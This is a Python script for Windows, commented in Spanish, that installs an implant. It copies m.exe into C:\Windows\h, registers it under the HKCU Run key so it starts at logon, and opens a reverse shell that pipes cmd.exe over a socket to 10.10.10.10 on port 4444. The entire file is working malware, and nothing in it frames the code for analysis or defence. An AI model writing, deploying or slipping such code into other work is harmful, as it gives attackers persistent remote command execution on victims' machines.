import winreg as reg
import os
import shutil
import socket
import subprocess
import threading
import multiprocessing
import time

def tarea_en_segundo_plano():
    while True:
        time.sleep(1000)

def agregar_al_inicio(ruta_archivo):
    nombre_archivo = os.path.basename(ruta_archivo)
    ruta_clave = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        clave = reg.OpenKey(reg.HKEY_CURRENT_USER, ruta_clave, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(clave, nombre_archivo, 0, reg.REG_SZ, ruta_archivo)
        reg.CloseKey(clave)
        print(f"{nombre_archivo} ha sido agregado a la lista de programas de inicio.")
    except WindowsError as e:
        print(f"Error al agregar el programa a la lista de inicio: {e}")

def copiar_archivo(origen, destino):
    try:
        shutil.copy(origen, destino)
        print(f"Archivo copiado de {origen} a {destino} exitosamente.")
    except FileNotFoundError as e:
        print(f"Error: el archivo de origen no existe. {e}")
    except PermissionError as e:
        print(f"Error: no se tienen los permisos necesarios para copiar el archivo. {e}")
    except Exception as e:
        print(f"Ocurrió un error inesperado: {e}")

def conectar_shell_inversa(ip, puerto):
    def s2p(s, p):
        while True:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()

    def p2s(s, p):
        while True:
            s.send(p.stdout.read(1))

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, puerto))

        p = subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

        s2p_thread = threading.Thread(target=s2p, args=[s, p])
        s2p_thread.daemon = True
        s2p_thread.start()

        p2s_thread = threading.Thread(target=p2s, args=[s, p])
        p2s_thread.daemon = True
        p2s_thread.start()

        p.wait()
    except Exception as e:
        print(f"Error en la conexión de la shell inversa: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    # Iniciar la tarea en segundo plano
    p_tarea = multiprocessing.Process(target=tarea_en_segundo_plano)
    p_tarea.start()

    # Ruta completa del archivo ejecutable que deseas agregar al inicio
    ruta_archivo_inicio = r"C:\Windows\h\m.exe"
    
    # Iniciar proceso para agregar al inicio
    p_inicio = multiprocessing.Process(target=agregar_al_inicio, args=(ruta_archivo_inicio,))
    p_inicio.start()

    # Obtener la ruta del directorio actual del programa
    directorio_actual = os.path.dirname(os.path.abspath(__file__))

    # Ruta completa del archivo origen
    archivo_origen = os.path.join(directorio_actual, "m.exe")

    # Ruta de destino
    directorio_destino = r"C:\Windows\h"
    if not os.path.exists(directorio_destino):
        os.makedirs(directorio_destino)

    archivo_destino = os.path.join(directorio_destino, "m.exe")
    
    # Iniciar proceso para copiar el archivo
    p_copiar = multiprocessing.Process(target=copiar_archivo, args=(archivo_origen, archivo_destino))
    p_copiar.start()

    # Dirección IP y puerto para la shell inversa
    ip_shell_inversa = "10.10.10.10"
    puerto_shell_inversa = 4444
    
    # Iniciar proceso para la shell inversa
    p_shell = multiprocessing.Process(target=conectar_shell_inversa, args=(ip_shell_inversa, puerto_shell_inversa))
    p_shell.start()

    # Esperar a que todos los procesos terminen
    p_tarea.join()
    p_inicio.join()
    p_copiar.join()
    p_shell.join()
